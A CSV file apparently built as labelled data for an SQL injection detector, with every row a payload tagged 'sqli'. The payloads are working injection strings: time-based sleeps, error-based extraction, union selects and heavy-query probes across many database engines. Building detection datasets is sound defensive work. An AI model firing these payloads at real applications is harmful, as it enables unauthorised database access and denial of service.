"pattern","type"
"1"")) as hzcq where 9250=9250 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--","sqli"
"1%"")) waitfor delay '0:0:5' and ((""%""=""","sqli"
"1' (select lhho where 7579=7579 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","sqli"
"1%'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('%'='","sqli"
"-7999) or 8422=1336","sqli"
"-9156')) union all select 9110,9110,9110,9110#","sqli"
"1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('vhqm'='vhqm","sqli"
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('clhg'='clhg","sqli"
"-6754') where 8388=8388 union all select 8388,8388,8388,8388,8388--","sqli"
"1%"")));select pg_sleep(5)--","sqli"
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('wgpg' like 'wgpg","sqli"
"1"" where 2483=2483;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#","sqli"
"1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('pneh' like 'pneh","sqli"
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('zovb' like 'zovb","sqli"
"1') as xvcr where 6456=6456 and 3824=benchmark(5000000,md5(0x76555642))--","sqli"
"1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('iaud'='iaud","sqli"
"1%"") and 8715=5529","sqli"
"-3234%"")) or elt(1032=1032,3623) and ((""%""=""","sqli"
"1')) as sjzf where 9997=9997 and 4193=5408","sqli"
"1')) as dckd where 1794=1794;select (case when (2914=3335) then 2914 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"-5369') or 3208=6669#","sqli"
"1%'));select sleep(5) and (('%'='","sqli"
"-6475""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""mdsx"" like ""mdsx","sqli"
"1',(select (case when (1392=1380) then 1 else 1392*(select 1392 from master..sysdatabases) end))","sqli"
"1 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1"")) as ynuw where 9138=9138;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--","sqli"
"1) rlike (select (case when (7689=7689) then 1 else 0x28 end))","sqli"
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph","sqli"
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('xcxr' like 'xcxr","sqli"
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","sqli"
"1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","sqli"
"1"") and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","sqli"
"1%'))) and (3020=3020)*6703 and ((('%'='","sqli"
"1 or 6793=(select 6793 from pg_sleep(5))# awpq","sqli"
"1' where 4358=4358 union all select null,null,null,null--","sqli"
"-3821') or 9323=9323#","sqli"
"1%') and elt(4249=4249,7259) and ('%'='","sqli"
"-4323')) or 6968=1393","sqli"
"1%""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--","sqli"
"1%""));begin user_lock.sleep(5); end--","sqli"
"-4137)) as elxu where 5672=5672 order by 1--","sqli"
"1' where 2964=2964 union all select null,null,null#","sqli"
"1' in boolean mode) and elt(1210=1210,sleep(5))#","sqli"
"1%' or (select * from (select(sleep(5)))ydpu) and '%'='","sqli"
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ""cgpm"" like ""cgpm","sqli"
"1"")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1')) waitfor delay '0:0:5' and (('bbqk'='bbqk","sqli"
"1'||(select 'rttq' from dual where 7368=7368 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))||'","sqli"
"1%' union all select null,null--","sqli"
"1' where 1017=1017 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","sqli"
"(1589=1589)*1","sqli"
"-9541 where 4291=4291 or 2724 in ((char(113) char(113) char(112) char(106) char(113) (select (case when (2724=2724) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113)))--","sqli"
"1) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))","sqli"
"1)) and 8635=(select count(*) from generate_series(1,5000000))--","sqli"
"1) and 7533=7533 and (7175=7175","sqli"
"-7786')) or 9323=9323#","sqli"
"-6665'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('winx'='winx","sqli"
"-6086')) or (6719=7280)*7280 and (('ozbj'='ozbj","sqli"
"1"" where 1452=1452 union all select null,null,null,null--","sqli"
"1'||(select 'wadx' where 4287=4287 or sleep(5)#","sqli"
"-4542')) order by 1#","sqli"
"-9978"" or make_set(4893=9765,9765) and ""mhjt""=""mhjt","sqli"
"1"" where 2221=2221 and 5318=8398--","sqli"
"1' in boolean mode) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","sqli"
"1'||(select 'jbgg' from dual where 1986=1986 union all select null,null,null,null,null,null,null,null,null,null#","sqli"
"1%"";select pg_sleep(5) and ""%""=""","sqli"
"1%"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""%""=""","sqli"
"1"") where 9285=9285 and 8506=8343#","sqli"
"1"" and (3020=3020)*6703","sqli"
"1"") union all select null,null,null,null,null,null,null,null--","sqli"
"1'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('yiem'='yiem","sqli"
"1"")) and 6969=(select 6969 from pg_sleep(5)) and ((""cowu"" like ""cowu","sqli"
"-6618""))) order by 1#","sqli"
"1"") where 4822=4822 union all select null,null,null,null,null,null,null,null,null,null--","sqli"
"1') and 2305=1934","sqli"
"1' (select hett where 7228=7228;waitfor delay '0:0:5') '","sqli"
"1%')));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--","sqli"
"1');select pg_sleep(5) and ('vnss' like 'vnss","sqli"
"1%"")));select (case when (5290=1720) then 5290 else 1/(select 0) end)--","sqli"
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","sqli"
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""dskh""=""dskh","sqli"
"1' (select dklk where 9862=9862 union all select null,null,null,null,null,null--","sqli"
"1')) as fcjk where 7755=7755;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--","sqli"
"-2782')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","sqli"
"1))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((7813=7813","sqli"
"1%' union all select null,null,null,null#","sqli"
"1"") where 3958=3958 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"-2701"")) as wvht where 5401=5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#","sqli"
"1%""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""%""=""","sqli"
"1))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((4744=4744","sqli"
"1'||(select 'ojdz' where 7350=7350 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'","sqli"
"1' where 6147=6147 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--","sqli"
"1') and sleep(5)","sqli"
"1%');select (case when (3773=3722) then 3773 else 3773*(select 3773 from mysql.db) end)#","sqli"
"1'));begin user_lock.sleep(5); end and (('vcaf' like 'vcaf","sqli"
"1"") union all select null,null,null,null#","sqli"
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('bmbt'='bmbt","sqli"
"-4093')) union all select 5785,5785,5785#","sqli"
"1) as tgqd where 6369=6369 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","sqli"
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","sqli"
"1)) as berd where 5803=5803 union all select null,null,null,null,null,null,null--","sqli"
"1%"" union all select null,null,null,null,null,null,null,null,null,null#","sqli"
"1' in boolean mode) and (3020=3020)*6703#","sqli"
"1,(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))","sqli"
"-9771' or 5113=5365","sqli"
"1' in boolean mode) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))#","sqli"
"1"") union all select null,null,null,null,null,null,null--","sqli"
"1) as lfra where 2669=2669 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--","sqli"
"1"") as hsws where 6656=6656;waitfor delay '0:0:5'--","sqli"
"-4756%')) union all select 7824,7824,7824,7824,7824,7824,7824,7824#","sqli"
"1%')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('%'='","sqli"
"-9881"")) or 9850=8118#","sqli"
"-9014' order by 1--","sqli"
"-5854))) union all select 5645#","sqli"
"-8436') as frmf where 7225=7225 or make_set(9354=9354,7185)--","sqli"
"1' in boolean mode) or 8156=(select count(*) from generate_series(1,5000000))--","sqli"
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""djrh""=""djrh","sqli"
"1%"")) or 6793=(select 6793 from pg_sleep(5)) and ((""%""=""","sqli"
"-9950' or 4425=1975","sqli"
"1%"";select count(*) from generate_series(1,5000000) and ""%""=""","sqli"
"1"" union all select null,null,null,null,null,null,null,null,null--","sqli"
"-8159 where 2793=2793 union all select 2793,2793,2793,2793,2793#","sqli"
"1) where 3076=3076 union all select null,null,null,null,null--","sqli"
"1%"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""%""=""","sqli"
"-6733') where 4024=4024 union all select 4024,4024,4024,4024#","sqli"
"1' and 8407=(select count(*) from generate_series(1,5000000))","sqli"
"1""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('bhlx' like 'bhlx","sqli"
"1') and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"-9581) as jkqo where 5200=5200 or 6872=6872--","sqli"
"1')) as tley where 3539=3539;select (case when (3855=3855) then 3855 else 1/(select 0) end)--","sqli"
"1"") where 7010=7010 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1"")) as wfne where 8933=8933;select (case when (3855=3855) then 3855 else 1/(select 0) end)--","sqli"
"1"")) as fapw where 4722=4722 union all select null,null,null,null,null,null,null,null,null,null#","sqli"
"1%"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""%""=""","sqli"
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'fgcg'='fgcg","sqli"
"1"") where 2633=2633 union all select null,null,null,null#","sqli"
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'eovg' like 'eovg","sqli"
"1' (select oqvo where 7448=7448 union all select null,null,null,null,null--","sqli"
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'jiyx'='jiyx","sqli"
"-3867%') or 3084=5633 and ('%'='","sqli"
"1""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""tiet"" like ""tiet","sqli"
"1 where 2823=2823 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1"" where 7796=7796;select case when 7717=7717 then 1 else null end--","sqli"
"1 rlike sleep(5)-- muhp","sqli"
"1')) as qaki where 5272=5272;call regexp_substring(repeat(right(char(2385),0),500000000),null)--","sqli"
"1 where 5080=5080;select (case when (5698=3453) then 5698 else 1/(select 0) end)--","sqli"
"-6540') where 5019=5019 or (8459=8459)*4906--","sqli"
"1' where 9003=9003 waitfor delay '0:0:5'--","sqli"
"-1203"")) or 8571=8571--","sqli"
"1 where 7442=7442;begin user_lock.sleep(5); end--","sqli"
"1%';(select * from (select(sleep(5)))acdk)#","sqli"
"1%') union all select null,null,null,null,null--","sqli"
"1%');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('%'='","sqli"
"1') where 8268=8268 union all select null,null,null,null--","sqli"
"-8023' or 6872=6872","sqli"
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""nubc"" like ""nubc","sqli"
"1);select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7711=7711","sqli"
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""ljkg""=""ljkg","sqli"
"1) or elt(6272=6272,sleep(5)) and (8600=8600","sqli"
"1'||(select 'dukt' where 3206=3206 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'","sqli"
"1%') and elt(3114=3114,sleep(5))#","sqli"
"-8093"")) as oboi where 1476=1476 union all select 1476,1476,1476,1476#","sqli"
"1 where 9932=9932;select sleep(5)--","sqli"
"-2751 where 6334=6334 or (9668=5845)*5845--","sqli"
"1)) rlike (select * from (select(sleep(5)))sgvo) and ((1476=1476","sqli"
"-3261""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""yxms""=""yxms","sqli"
"1"" where 4066=4066 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--","sqli"
"1' where 8083=8083 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--","sqli"
"-3059 or 1570=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (1570=1570) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113)))","sqli"
"1 where 8506=8506;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--","sqli"
"1%"")) or 8156=(select count(*) from generate_series(1,5000000))--","sqli"
"1') as inid where 7812=7812 or 6793=(select 6793 from pg_sleep(5))--","sqli"
"1)) as efjb where 4642=4642 order by 1#","sqli"
"1) union all select null,null,null,null,null--","sqli"
"1)) as uizx where 2512=2512 and make_set(1402=2908,2908)--","sqli"
"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--","sqli"
"1"");waitfor delay '0:0:5' and (""dmcu""=""dmcu","sqli"
"1%' and (2439=2555)*2555 and '%'='","sqli"
"1%')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='","sqli"
"1'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('subq' like 'subq","sqli"
"1')) as ijyi where 3694=3694 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--","sqli"
"1%')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='","sqli"
"1' (select lqhd where 4251=4251 and (8754=5779)*5779) '","sqli"
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'ptou'='ptou","sqli"
"1%"") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
